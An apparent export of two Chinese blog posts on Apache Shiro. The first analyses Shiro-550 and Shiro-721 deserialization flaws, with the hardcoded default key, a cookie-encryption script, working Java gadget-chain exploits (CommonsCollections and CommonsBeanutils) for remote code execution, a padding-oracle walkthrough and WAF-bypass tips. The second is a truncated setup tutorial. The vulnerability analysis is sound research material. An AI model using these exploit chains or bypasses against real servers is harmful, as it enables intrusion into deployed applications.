encrypted_data = shiro_encrypt(data, key_base64) return encrypted_dataif __name__ == &quot;__main__&quot;: parser = argparse.ArgumentParser(description=&#x27;Encrypt data using Shiro encryption method&#x27;) parser.add_argument(&#x27;file_path&#x27;, help=&#x27;Path to file containing data to encrypt&#x27;) parser.add_argument(&#x27;-k&#x27;, &#x27;--key&#x27;, help=&#x27;Base64 encoded key (optional, defaults to Shiro\\&#x27;s default key)&#x27;, default=&#x27;2AvVhdsgUs0FSA3SDFAdag==&#x27;) parser.add_argument(&#x27;-b&#x27;, &#x27;--binary&#x27;, action=&#x27;store_true&#x27;, help=&#x27;Read file as binary (serialized data) instead of base64 encoded data&#x27;) args = parser.parse_args() try: if args.binary: result = process_binary_file(args.file_path, args.key) else: result = process_base64_file(args.file_path, args.key) print(result, end=&quot;&quot;) except Exception as e: print(f&quot;Error: &#123;e&#125;&quot;) sys.exit(1) Shiro550在shiro1.2.4中，AES的key是硬编码在代码中的，那么可以通过爆破key生成不同的数据发送，根据响应来判断是否key是否正确。 CC链shiro没有内置CC链，所以利用需要目标系统存在CC链 当前测试环境中在samples/web目录下的pom.xml添加CC链的依赖，注意这里scope一定要添加 这里以CC链3为例，还是使用yakit生成base64，然后通过脚本生成cookie，发送之后，IDEA报错了，并且命令也没有运行 这里报错提示Unable to load clazz named [[Lorg.apache.commons.collections.Transformer;] from class loader [ParallelWebappClassLoader，这里是说这个类加载不到 那现在到触发反序列化的地方看看 具体位置在报错提示中可以看到，点击就能进入方法 进入到org.apache.shiro.io.DefaultSerializer#deserialize方法，在T deserialized = (T) ois.readObject();打上断点。可以看出来，其实这里并没有使用ObjectInputStream去调用readObject，其实是调用的ClassResolvingObjectInputStream这个类，这是shiro自定义的对象输入流。也就是说在ClassResolvingObjectInputStream类里面进行了一些处理，导致出现了这个问题。 进入这个类看看，这个类只有两个方法，一个构造方法，还有一个是重写的resolveClass方法，在java原生反序列化时就会调用到这个方法，这里进行重写了，那么在进行反序列化时就会调用到这个方法。 这里对比一下原生的ObjectInputStream#resolveClass的写法 可以看到，两个方法都是通过forName进行类加载。但是shiro中是使用classUtils进行调用，这是shiro自己写的工具类，那么看看这个classUtils.forName是怎么写的。 这个方法内是通过一些自写的类的loadClass方法进行类加载，这里总共会使用不同的加载器加载三次。宏观来说，这里的loadClass不能出现数组类，而原生ObjectInputStream类调用的Class.forName可以出现数组类。这里涉及到tomcat类加载的一些细节。 也就是说这条利用链不能出现数组类，也就是CC链中使用的transformer[]不能用了，所以这里需要改写一下CC链版本，回顾一下CC链的构成，想办法构造出一个不会产生数组transformer的CC链进行利用 最终EXP如下： 注意在CC链3中的恶意类需要继承AbstractTranslet，这里的恶意类同样需要继承这个类 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051package com.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.Map;public class ShiroExp &#123; public static void main(String[] args) throws Exception &#123; TemplatesImpl templates = new TemplatesImpl(); Class&lt;?&gt; tc = templates.getClass(); Field nameField = tc.getDeclaredField(&quot;_name&quot;); nameField.setAccessible(true); nameField.set(templates, &quot;aaaa&quot;); Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(&quot;E:/Temp/RCE.class&quot;)); byte[][] codes = &#123;code&#125;; bytecodesField.set(templates, codes); // CC链2 InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, null, null); // CC链6 HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, templates); HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;(); map2.put(tiedMapEntry, &quot;bbb&quot;); lazyMap.remove(templates); Class&lt;?&gt; c = lazyMap.getClass(); Field factory = c.getDeclaredField(&quot;factory&quot;); factory.setAccessible(true); factory.set(lazyMap, invokerTransformer); util.serialize(map2); util.unserialize(&quot;ser.bin&quot;); &#125;&#125; 将生成的ser.bin通过脚本，获得可利用的cookie字段，放到请求中进行发送，成功弹窗。 shiro无外部依赖利用链：CB链shiro包默认情况下是没有CC依赖的，那么默认情况下只能打shiro包中的CB链，这里的cb是对javaBean进行增强。 CB依赖的作用在常规方法下，调用一个javaBean需要如下操作 12Person person = new Person(&quot;张三&quot;, 18);person.getName(); 通过CB依赖的加强，能够使得调用javaBean更加方便、动态。 在web中就可以直接用接收的参数进行动态的执行不同的函数 12Person person = new Person(&quot;张三&quot;, 18);PropertyUtils.gerProperty(person, &quot;name&quot;); CB链由上可知，这里可能存在动态执行代码的地方，跟进gerProperty方法，该方法最终是调用了getNestedProperty(bean, name)这个方法 跟进getNestedProperty方法，这里有很多判断 继续向下执行，执行到if (bean instanceof Map)这个判断，这里是根据类型去获取bean，最后会根据getSimpleProperty(bean, name);去获取，跟进一下getSimpleProperty方法。 在该方法执行到代码PropertyDescriptor descriptor = getPropertyDescriptor(bean, name);处之后，会看到descriptor中就拿到了set/get方法的名字，以及对应的属性名 继续向下执行，可以看到在寻找对应的方法，以及invokeMethod进行反射调用。 而这个invokeMethod是在根据对象来调用一个符合javaBean格式的方法。 在CC链3中，templateimpl中存在一个getOutputProperties方法，最后会进行类加载。并且这个方法是get开头，符合javaBean方法。如果通过最开始的PropertyUtils.gerProperty方法去调用template对象的getOutputProperties是否能进行类加载呢。 构造一下代码，这里是CC链3中通过反射给templates进行赋值，然后通过PropertyUtils.getProperty调用方法。 123456789101112131415161718192021public static void main(String[] args) throws Exception &#123; TemplatesImpl templates = new TemplatesImpl(); String evilClassPath = &quot;E:/Temp/RCE.class&quot;; byte[] evilBytecode = Files.readAllBytes(Paths.get(evilClassPath)); // 通过反射给属性赋值 Class templatesClass = templates.getClass(); Field nameFied = templatesClass.getDeclaredField(&quot;_name&quot;); nameFied.setAccessible(true); nameFied.set(templates, &quot;test&quot;); Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;); bytecodesField.setAccessible(true); byte[][] codes = &#123;evilBytecode&#125;; bytecodesField.set(templates, codes); Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;); tfactoryField.setAccessible(true); tfactoryField.set(templates, new TransformerFactoryImpl()); PropertyUtils.getProperty(templates, &quot;outputProperties&quot;);&#125; 运行之后能够执行到恶意代码，那么如果getProperty方法中的参数可以被控制，就能动态执行代码。 那么结合反序列化思路，继续寻找getProperty的方法调用，可以看到这里其实没有几处调用 经过寻找，在BeanComparator#compare这个方法中的调用是我们可以进行利用的。并且其中的参数是可以被利用的，该方法所处的类也是实现了Serializable接口能够进行序列化的。 并且在CC链2的调用过程中是利用过compare的，那么 这里是否能够结合起来呢？ EXP构造CC链2的入口是优先队列PriorityQueue这个类的readObject方法，然后调用siftUp-&gt;siftUpUsingComparator-&gt;comparator.compare 整体利用链思路大概如下： 要让comparator.compare执行到getProperty，那么就需要给comparator赋值为Beancomparator 所以这里需要新建一个Beancomparator对象，其中调用getProperty的地方还需要一个属性，这个属性就是要调用的方法 而这个属性能够通过构造方法传入 然后需要将这个Beancomparator传入到PriorityQueue#comparator属性中，后面就和CC链2中一致，做一个优先队列，然后序列化 那么构造出EXP如下： 12345678910111213141516171819202122232425262728293031323334public static void main(String[] args) throws Exception &#123; // CC链3中templates执行代码 TemplatesImpl templates = new TemplatesImpl(); String evilClassPath = &quot;E:/Temp/RCE.class&quot;; byte[] evilBytecode = Files.readAllBytes(Paths.get(evilClassPath)); // 通过反射给属性赋值 Class templatesClass = templates.getClass(); Field nameFied = templatesClass.getDeclaredField(&quot;_name&quot;); nameFied.setAccessible(true); nameFied.set(templates, &quot;test&quot;); Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;); bytecodesField.setAccessible(true); byte[][] codes = &#123;evilBytecode&#125;; bytecodesField.set(templates, codes); Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;); tfactoryField.setAccessible(true); tfactoryField.set(templates, new TransformerFactoryImpl()); // 构造BeanComparator并传入属性 BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;); // CC链2中执行到compare方法 PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(beanComparator); priorityQueue.add(templates); priorityQueue.add(2); util.serialize(priorityQueue);&#125; 运行时报错，提示NoSuchMethodException 这里是在BeanComparator这里出现了异常，这里还是可以借用以前CC链中的思路，先中断原本的利用链，在序列化之前通过反射重新赋值恢复利用链。这里就对BeanComparator进行处理。按照CC链2的方式，构造出来的EXP如下： 123456789101112131415161718192021222324252627282930313233343536373839public static void main(String[] args) throws Exception &#123; // CC链3中templates执行代码 TemplatesImpl templates = new TemplatesImpl(); String evilClassPath = &quot;E:/Temp/RCE.class&quot;; byte[] evilBytecode = Files.readAllBytes(Paths.get(evilClassPath)); // 通过反射给属性赋值 Class templatesClass = templates.getClass(); Field nameFied = templatesClass.getDeclaredField(&quot;_name&quot;); nameFied.setAccessible(true); nameFied.set(templates, &quot;test&quot;); Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;); bytecodesField.setAccessible(true); byte[][] codes = &#123;evilBytecode&#125;; bytecodesField.set(templates, codes); Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;); tfactoryField.setAccessible(true); tfactoryField.set(templates, new TransformerFactoryImpl()); // 构造BeanComparator并传入属性 BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;); // CC链2中执行到compare方法 TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1)); PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator); priorityQueue.add(templates); priorityQueue.add(templates); Class&lt;? extends PriorityQueue&gt; aClass = priorityQueue.getClass(); Field comparatorField = aClass.getDeclaredField(&quot;comparator&quot;); comparatorField.setAccessible(true); comparatorField.set(priorityQueue, beanComparator); util.serialize(priorityQueue);&#125; 然后将生成的bin文件通过脚本处理获得cookie字段，发送之后，执行失败，查看IDEA的报错信息，这里不能引用到CC中的ComparableComparator 但是我们的代码最后生成的序列化数据是不包含CC相关信息，怎么会产生这个问题呢？ 在EXP中调用的BeanComparator的构造方法中，有ComparableComparator.getInstance()这串代码 而这个是CC中的，也就是说CB中中调用到BeanComparator并且调用这个构造方法的话，它本身就回去调用CC。问题怎么解决呢？ 在下面还有一个构造方法，接收一个参数comparator，这里就可以不去调用ComparableComparator.getInstance()这个方法，那我们传入一个CB中有的或者JDK中有的就能够解决。 怎么找到这个类？首先这个类需要实现Comparator接口，还需要实现Serializable接口才能序列化和反序列化 直接获取到这两个接口所有的实现类，复制出来，找到相同的类，然后看看是否可以利用即可。 然后找到了一个AttrCompare类，同时实现了这两个接口，并且这是jdk自带的类，通过public修饰，这就挺好的 然后构造最终EXP如下： 123456789101112131415161718192021222324252627282930313233343536373839public static void main(String[] args) throws Exception &#123; // CC链3中templates执行代码 TemplatesImpl templates = new TemplatesImpl(); String evilClassPath = &quot;E:/Temp/RCE.class&quot;; byte[] evilBytecode = Files.readAllBytes(Paths.get(evilClassPath)); // 通过反射给属性赋值 Class templatesClass = templates.getClass(); Field nameFied = templatesClass.getDeclaredField(&quot;_name&quot;); nameFied.setAccessible(true); nameFied.set(templates, &quot;test&quot;); Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;); bytecodesField.setAccessible(true); byte[][] codes = &#123;evilBytecode&#125;; bytecodesField.set(templates, codes); Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;); tfactoryField.setAccessible(true); tfactoryField.set(templates, new TransformerFactoryImpl()); // 构造BeanComparator并传入属性 BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;, new AttrCompare()); // CC链2中执行到compare方法 TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1)); PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator); priorityQueue.add(templates); priorityQueue.add(2); Class&lt;? extends PriorityQueue&gt; aClass = priorityQueue.getClass(); Field comparatorField = aClass.getDeclaredField(&quot;comparator&quot;); comparatorField.setAccessible(true); comparatorField.set(priorityQueue, beanComparator); util.serialize(priorityQueue);&#125; 此时再次利用脚本生成payload，发送即可成功执行。 注意，如果EXP中CB版本和目标中的CB版本存在一定差距，那么反序列化时会产生serialVersionUID的错误 Shiro721参考链接： shiro 721 反序列化漏洞复现与原理以及Padding Oracle Attack攻击加解密原理_shiro721原理-CSDN博客 Padding-Oracle-Attack详解 - 百度文库 shiro721利用相对鸡肋，这里只描述大概原理。 与550的区别漏洞版本 550：shiro &lt; 1.2.4及以下版本 721: 1.2.5 &lt; shiro &lt; 1.4.1 利用方式 550：通过碰撞获得硬编码的密钥，然后对构造的序列化数据进行加密，然后发送到服务端。 721：需要先登录获取一个rememberMe的cookie，然后通过Padding Oracle攻击来构造恶意的EXP shiro721与shiro550的区别就是，550中aes的key采用的硬编码，而721是采用AesCipherService#generateNewKey()方法来生成一个密钥，这个方法的内部是通过SecureRandom生成随机字节序列，然后用来构造一个SecretKeySpec对象，最终通过getEncoded获取密钥序列。 也就是说721需要先登录获取到加密后的Cookie。 padding oracle attack了解padding oracle attack需要先了解一些知识点： 分组密码：常用的对称算法，如DES、AES只能加密和密钥长度相同的数据，超长的数据会将明文信息编码后的数字按照长度分为n个组，如常见的64bit、128bit、256bit几种长度。但是明文不可能恰好是分组大小的整数倍，也就会导致有一部分是不满足到分组长度的。 分组密码填充：在对信息进行分组后，不满足分组长度的部分，会进行填充。如果原始数据比密钥短也会进行填充，这里又涉及到填充算法，如PKCS#5。 **PKCS#5**：在数据需要填充时，该算法会使用缺失的长度来统一填充，比如缺少5位，那么缺的每一位就使用0x05进行填充，缺少2位，就使用0x02填充。如果刚刚好，但是还需要扩展出一组，该组内就全部使用0x08填充，如下图所示。如果分组后刚好合适，那么额外添加一组，这一组明文数据一定都是0xXY CBC加密模式：padding oracle attack跟加密方法无关，跟加密模式有关，只是针对CBC这种加密模式。CBC模式中，每个明文块先与前一个密文块进行异或，再进行加密，在这种方法中，每个密文块都依赖它前面所有的明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量(iv)。如下图所示 CBC解密：CBC模式的解密就是加密模式的反推过程，因此，双方除了要加密密文外，还需要交换初始向量(iv)，可以看到在解密过程中，第一组的加密数据，就是第二组的iv值。那么 那么如果能够拿到密文通过key解密后的中间值，再与iv异或，就能够得到明文，并且明文中会包含填充信息 假如得到的最后一组明文的最后一组数据是0x01，它是通过密文与key解密计算得到的中间值mid，然后与前一组密文作为iv计算得到的。类似于mid/iv=0x01，这里mid是不变的，如果iv可以控制，那么就可以从iv的值即00到ff进行遍历，最后得到明文为0x01时的iv值 攻击条件： 如果解密过程没有问题，明文验证通过(如用户名密码验证)也通过，会返回正常信息和状态(如登陆成功)。 如果解密过程没有问题。但是明文验证出错(如用户名密码验证)，还是会返回正常信息，但是明文内容出错返回内容产生区别(如用户名或密码错误) 如果解密过程出现问题，比如Padding规则核对不上，则会爆出错误，导致解密出现问题，产生另外一种返回状态。 也就是说，可以被利用的条件是：针对解密过程产生的异常会有不同的提示。能够区分是什么情况导致。 举例某服务请求为http://a.b.com/xx?id=7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6，其id的前8个字节7B216A634951170F是初始向量(iv)，那么这个服务是如何加解密字符串BARIN;12;1的 加密 先对字符串进行分组，可以看到下图中将字符串分为两组，然后填充了5个0x05 然后第一组与iv进行异或之后获取中间值，加密后得到的值作为第二组的iv 第二组与获得的iv进行异或，然后进行加密得到了新的加密数据 第一组加密数据和第二组加密数据组合起来就的得到了加密后的数据 解密 同样先对加密后数据进行分组，第一组是初始化向量iv，第二组开始才是密文。 使用密钥对密文的第一组开始解密，得到中间值。第一组只要密文不变，则中间值不变。 中间值与IV异或得到明文 第二组将中间值与第一组的密文进行异或得到第二组明文 第一组明文与第二组明文拼接起来得到填充后的明文数据，密码算法校验明文的格式(填充格式是否正确) 校验通过得到明文，校验失败得到密文。 总结 通过解密过程可以看出，初始化向量是直到的，如果直到中间值，即图中的Initialization Vector，在不需要知道加密密钥的情况下，仅仅通过异或，就能够知道明文信息，甚至还可以通过中间值仿造任意的明文字段做暴力攻击。 attack首先要知道，系统判断解密是否成功的点是解密后明文(包含填充时)最后一位或者几位的值是否满足分组逻辑。 如果进行了明文填充，那么最后一位一定是0x01-0x08之间 如果没有明文填充，那么会额外添加一个组，最后一个值一定是0x08 如果解密后得到的明文不满足这两个条件，那么解密就失败了。 那么假如得到一段加密后的数据7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6，就可以进行如下操作。 初始化向量设置为0x00同时仅保留第一个块，得到的数据就是0000000000000000F851D6CC68FC9537，0x00与任何数据异或都只会得到数据本身。 发送数据到服务端，此时填充校验会发生错误，返回报错，因为解密后明文不在两种可能性之间。也必定不在两者之间，因为这里是直接截取加密后的第一组密文并且只有一组，所以服务器会认为这就是最后一组数据，一定会有填充数据，那么当解密后明文满足填充时，才会解密成功。当然服务器不会返回具体数据，会返回解密失败或相关错误。 然后将向量最后一个字节从0x01~0xFF递增，即0000000000000001F851D6CC68FC9537，那么需要满足的填充就是0x01，即解密后最后一位明文是0x01。此时数据发送到服务端，不满足填充，依然会返回报错 由于中间值是固定的(即Intermediary Value)，必然存在一个字节与它异或时，能够满足条件，那么此时iv的最后一个字节为0x3C与中间值异或得到0x01，满足填充，那么服务端此时不会返回解密错误相关信息。此时就可以通过0x01与0x3C进行逆推，得到中间值0x3D 接下来就是去获取倒数第二位的中间值。此时需要满足填充的话，那么倒数第一位和倒数第二位填充都是0x02。当满足这个条件的时，通过iv与0x02进行异或，就能得到倒数第二位的中间值。依次类推获得第一组加密数据的全部中间值。 此时将第一组的中间值与已知的iv进行异或，就能得到第一组的明文。 同理获得第二组加密密文的中间值，然后与第一组密文进行异或，就能得到第二组的明文。直到获取所有的明文。 在shiro721中的利用原理这里是我根据已有的工具得出的结论。 我们目前有一段反序列化链，是如何在不知道密钥的情况下，通过padding oracle对shiro 721实现攻击的呢？ 首先需要登录获取登陆后的cookie，然后对这个cookie密文分组，并进行padding oracle获得最后一组密文的中间值。 然后使用最后一组密文中间值与恶意明文最后一组进行异或，这时会得到一组iv，这组iv就是倒数第二组的密文，然后依次构造直到获得完整密文。 shiro绕wafshiro绕waf方法： HTTP请求方法随机 HTTP请求方法置空 Shiro数据包添加脏数据 Shiro字段添加空白字符 Host头域名变IP地址 具体操作参考以下链接： 参考链接：https://mp.weixin.qq.com/s/N4wF28mCWprD2edSd91L0Q 解决Cookie字段过长中间件对于请求头大小是有默认大小的，tomcat默认的maxHttpHeaderSize配置是4096个字节，有一些payload很长，发送到服务端会产生报错造成攻击失败。如果要修改，则需要修改tomcat的配置文件server.xml，然后重启tomcat &lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot; connectionTimeout=&quot;20000&quot; redirectPort=&quot;8443&quot; maxHttpHeaderSize=&quot;40960000&quot;/&gt; 但是从攻击者的视角来说，并不能直接修改配置文件，那么应该怎么解决这个问题呢 这里存在几种方式方式： 通过反序列化修改maxHttpHeaderSize的大小 将字节码数据放在POST请求 缩短Payload+分散发包 Gzip+Base64压缩编码类字节码 具体操作参考以下链接： 浅析Shiro反序列化Payload长度绕过 浅谈Shiro550受Tomcat Header长度限制影响突破","categories":[],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"Shiro","slug":"Shiro","permalink":"http://example.com/tags/Shiro/"}]},{"title":"Shiro历史漏洞分析(1)：环境搭建与Shiro上手","slug":"Shiro历史漏洞分析-1-：环境搭建与Shiro上手","date":"2025-08-10T14:06:45.000Z","updated":"2025-10-16T13:04:19.157Z","comments":true,"path":"2025/08/10/Shiro历史漏洞分析-1-：环境搭建与Shiro上手/","permalink":"http://example.com/2025/08/10/Shiro%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1-%EF%BC%9A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8EShiro%E4%B8%8A%E6%89%8B/","excerpt":"","text":"Shiro是什么Shiro 是 Apache Shiro 的简称，是一个强大且易于使用的 Java 安全框架，主要用于保护应用程序的安全性。它提供了以下核心功能： 身份验证（Authentication）：验证用户身份，确保用户是合法的。 授权（Authorization）：控制用户对系统资源的访问权限，支持基于角色和基于权限的访问控制。 会话管理（Session Management）：管理用户会话，支持 Web 和非 Web 环境。 加密（Cryptography）：提供密码加密和解密支持，确保数据安全。 Web 支持：与主流 Web 框架（如 Spring、Struts）集成。 简单来说，这是一个用来做鉴权认证的组件。 Shiro的架构Shiro体系结构具有3个主要概念：Subject、SecurityManager、Realms Subject：本质上是当前执行用户的特定于安全性的视图。可以是一个人，也可以表示第三方服务、守护程序账户或任何类似的东西，基本上是当前与该软件交互的任何东西。Subject个实例都绑定到SecurityManager，与Subject交互时，这些交互会转换为与SecurityManager特定于主题的交互。 SecurityManager：这是Shiro体系结构的核心，安全管理器，所有与安全有关的操作都会和SecurityManager交互，并管理着所有的Subject。负责与Shiro其他组件交互。 Realm：Shiro从Realm获取安全数据比如用户、角色、权限。当SecurityManager需要验证用户身份时，就需要从Realm获取相应的用户进行比较，来确定用户身份是否合法。 Shiro初上手在了解shiro漏洞之前，还需要了解shiro的使用方法，才能更好的理解漏洞的产生 环境配置直接创建一个普通的MAVEN项目，然后新建一个模块，在模块的pom.xml文件中添加如下依赖： 123456789101112131415161718192021222324252627&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt; &lt;artifactId&gt;shiro-core&lt;/artifactId&gt; &lt;version&gt;1.4.1&lt;/version&gt; &lt;/dependency&gt; &lt;!-- configure logging --&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;jcl-over-slf4j&lt;/artifactId&gt; &lt;version&gt;1.7.21&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt; &lt;version&gt;1.7.21&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j&lt;/artifactId&gt; &lt;version&gt;1.2.17&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 在模块的resource中，还需要添加资源文件log4j.properties与shiro.ini 这里推荐直接用shiro 1.5版本中samples/quickstart中的文件 其中log4j这里是一些日志打印相关的配置 而shiro.ini 然后将samples/quickstart/java/Quickstart.java复制到模块中的java目录中，然后直接运行Quickstart，控制台输出如下信息，则说明已经搭建完成。 Subject分析接下来分析下Quickstart这部分代码，这一部分就是Subject的代码，主要是用户相关信息 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788public class Quickstart &#123; // 这里是日志输出 private static final transient Logger log = LoggerFactory.getLogger(Quickstart.class); public static void main(String[] args) &#123; // 这里Factory就是工厂模式，从配置文件中加载信息，这里的配置文件中就包含用户和角色 Factory&lt;SecurityManager&gt; factory = new IniSecurityManagerFactory(&quot;classpath:shiro.ini&quot;); // 通过工厂模式创建安全实例 SecurityManager securityManager = factory.getInstance(); SecurityUtils.setSecurityManager(securityManager); // 这里在通过shiro设置session // 这里就开始出现Subject // 通过这个方法获得当前用户对象 Subject currentUser = SecurityUtils.getSubject(); // 通过当前用户拿到shiro session Session session = currentUser.getSession(); // 在session中设置值 session.setAttribute(&quot;someKey&quot;, &quot;aValue&quot;); // 在session中获取值 String value = (String) session.getAttribute(&quot;someKey&quot;); if (value.equals(&quot;aValue&quot;)) &#123; log.info(&quot;Retrieved the correct value! [&quot; + value + &quot;]&quot;); &#125; // 这里在判断当前用户是否被认证 if (!currentUser.isAuthenticated()) &#123; // 生成令牌，这里还没有获取令牌，采用随机的方式 UsernamePasswordToken token = new UsernamePasswordToken(&quot;lonestarr&quot;, &quot;vespa&quot;); // 设置记住 token.setRememberMe(true); try &#123; currentUser.login(token); // 执行登录操作 &#125; catch (UnknownAccountException uae) &#123; // 未知账户异常 log.info(&quot;There is no user with username of &quot; + token.getPrincipal()); &#125; catch (IncorrectCredentialsException ice) &#123; log.info(&quot;Password for account &quot; + token.getPrincipal() + &quot; was incorrect!&quot;); &#125; catch (LockedAccountException lae) &#123; log.info(&quot;The account for username &quot; + token.getPrincipal() + &quot; is locked. &quot; + &quot;Please contact your administrator to unlock it.&quot;); &#125; // ... catch more exceptions here (maybe custom ones specific to your application? catch (AuthenticationException ae) &#123; //unexpected condition? error? // 这里是产生认证异常 &#125; &#125; //say who they are: //print their identifying principal (in this case, a username): // 获取当前用户的信息 log.info(&quot;User [&quot; + currentUser.getPrincipal() + &quot;] logged in successfully.&quot;); //test a role: if (currentUser.hasRole(&quot;schwartz&quot;)) &#123; log.info(&quot;May the Schwartz be with you!&quot;); &#125; else &#123; log.info(&quot;Hello, mere mortal.&quot;); &#125; //test a typed permission (not instance-level) // 这部分代码是鉴别用户权限，与配置文件中的权限相关 if (currentUser.isPermitted(&quot;lightsaber:wield&quot;)) &#123; log.info(&quot;You may use a lightsaber ring. Use it wisely.&quot;); &#125; else &#123; log.info(&quot;Sorry, lightsaber rings are for schwartz masters only.&quot;); &#125; //a (very powerful) Instance Level permission: if (currentUser.isPermitted(&quot;winnebago:drive:eagle5&quot;)) &#123; log.info(&quot;You are permitted to &#x27;drive&#x27; the winnebago with license plate (id) &#x27;eagle5&#x27;. &quot; + &quot;Here are the keys - have fun!&quot;); &#125; else &#123; log.info(&quot;Sorry, you aren&#x27;t allowed to drive the &#x27;eagle5&#x27; winnebago!&quot;); &#125; //all done - log out! // 注销 currentUser.logout(); // 结束 System.exit(0); &#125;&#125; 在SpringBoot中的使用项目搭建在当前项目中新建一个springboot的模块，模块中勾选Spring Web和Themeleaf 在代码目录中新建一个controller目录，然后新建一个controller类 12345678910111213141516package org.example.shirospringboot.controller;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.RequestMapping;@Controllerpublic class MyController &#123; @RequestMapping(&quot;/&quot;) public String toIndex(Model model) &#123; model.addAttribute(&quot;msg&quot;, &quot;hello, shiro&quot;); return &quot;index&quot;; &#125;&#125; 在resources目录下新建一个templates目录，然后新建一个index文件 1234567891011&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;首页&lt;/h1&gt;&lt;p th:text=&quot;$&#123;msg&#125;&quot;&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 此时启动项目，访问首页，效果如下 整合shiro在这个web项目的pom.xml中导入shiro依赖 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt; &lt;artifactId&gt;shiro-spring&lt;/artifactId&gt; &lt;version&gt;1.4.1&lt;/version&gt;&lt;/dependency&gt; 编写shiro配置类ShiroConfig.java，配置类中存在三大核心要素 ShiroFilterFactoryBean：shiro的过滤工厂对象 DafaultWebSecurityManager：shiro的安全管理器 Realm：shiro的realm对象 这就对应着shiro的三个主要概念。配置的时候从下往上配置，先配置realm对象，然后通过DafaultWebSecurityManager接管对象，最后返回到ShiroFilterFactoryBean 配置realm12345678910111213141516public class UserRealm extends AuthorizingRealm &#123; // 重写授权方法 @Override protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principals) &#123; System.out.println(&quot;执行了授权方法：doGetAuthorizationInfo&quot;); return null; &#125; // 重写认证方法 @Override protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException &#123; System.out.println(&quot;执行了认证方法：doGetAuthenticationInfo&quot;); return null; &#125;&#125; 配置shiroConfig1234567891011121314151617181920212223242526@Configurationpublic class ShiroConfig &#123; //ShiroFilterFactoryBean，这是shiro的过滤工厂对象 @Bean public ShiroFilterFactoryBean getShiroFilterFactoryBean(@Qualifier(&quot;securityManager&quot;) DefaultWebSecurityManager securityManager) &#123; ShiroFilterFactoryBean bean = new ShiroFilterFactoryBean(); // 关联安全管理器 bean.setSecurityManager(securityManager); return bean; &#125; // DafaultWebSecurityManager，这是shiro的安全管理器 @Bean(name=&quot;securityManager&quot;) public DefaultWebSecurityManager getDefaultWebSecurityManager(@Qualifier(&quot;userRealm&quot;) UserRealm userRealm) &#123; DefaultWebSecurityManager securityManager = new DefaultWebSecurityManager(); // 关联Realm securityManager.setRealm(userRealm); return securityManager; &#125; // Realm，创建Realm对象，需要自定义，继承AuthorizingRealm @Bean public UserRealm userRealm() &#123; return new UserRealm(); &#125;&#125; 在config中设置拦截在templates目录中新增一个user目录，然后新增两个页面，大概内容如下 然后在之前的controller中增加对应的路由 最后在index文件增加一个超链接用来跳转 配置完成之后运行项目，点击超链接即可跳转到对应的页面中即可，后续需要针对这两个新增页面进行权限控制 接下来就需要在ShiroConfig中配置过滤器，先来看看有哪些内置过滤器 